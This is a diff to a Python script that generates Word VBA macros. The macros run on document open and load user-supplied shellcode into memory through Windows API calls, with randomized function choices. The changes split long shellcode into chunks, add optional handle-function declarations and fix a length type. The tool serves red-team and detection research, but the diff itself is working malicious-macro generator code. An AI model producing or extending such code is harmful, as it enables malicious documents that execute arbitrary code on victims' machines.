@@ -3,8 +3,8 @@ import random, sys
 
 __author__  = "Jeff White [karttoon]"
 __email__   = "karttoon@gmail.com"
-__version__ = "1.0.0"
-__date__    = "17JAN2017"
+__version__ = "1.0.1"
+__date__    = "04APR2017"
 
 # Dictionary structures
 # key = Function name
@@ -221,14 +221,25 @@ macro += '''
 ################################################\n
 ''' % (allocFunc, writeFunc, shellFunc)
 
+# Headers
 macro += memAlloc[allocFunc][1]
 macro += memWrite[writeFunc][1]
 macro += exeShell[shellFunc][1]
-macro += '''
+if 'WH' in macFlag:
+    macro += 'Private Declare Function getWindowHandle Lib "user32" Alias "GetActiveWindow" () As Long'
+if 'PH' in macFlag:
+    macro += 'Private Declare Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As Long'
+if 'TH' in macFlag:
+    macro += 'Private Declare Function getThreadHandle Lib "kernel32" Alias "GetCurrentThread" () As Long'
+if 'MH' in macFlag:
+    macro += 'Private Declare Function getModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long'
+
+# Body
+macro += '''\n
 Private Sub Document_Open()
 
 Dim shellCode As String
-Dim shellLength As Byte
+Dim shellLength As Long
 Dim byteArray() As Byte
 Dim memoryAddress As Long
 '''
@@ -266,14 +277,23 @@ if len(sys.argv) == 2:
     sys.argv[1] = sys.argv[1].replace('"', '')
     sys.argv[1] = sys.argv[1].replace(';', '')
     sys.argv[1] = sys.argv[1].replace(' ', '')
-    macro += '''
-shellCode = "%s"
-''' % sys.argv[1]
+
+    print "temp\n%s\n" % sys.argv[1]
+
+    if len(sys.argv[1]) > 256:
+        macro += '''
+shellCode = "%s"''' % sys.argv[1][0:256]
+        for i in range(256,len(sys.argv[1]),256):
+            macro += '''
+shellCode = shellCode & "%s"''' % sys.argv[1][i:i+256]
+    else:
+        macro += '''
+shellCode = "%s"''' % sys.argv[1]
 else:
     print '[!] ERROR: Supply hexadecimal shellcode as input (eg msfvenom -p windows/exec CMD=\'calc.exe\' -f c)'
     sys.exit(1)
 
-macro += '''
+macro += '''\n
 shellLength = Len(shellCode) / 2
 ReDim byteArray(0 To shellLength)
 
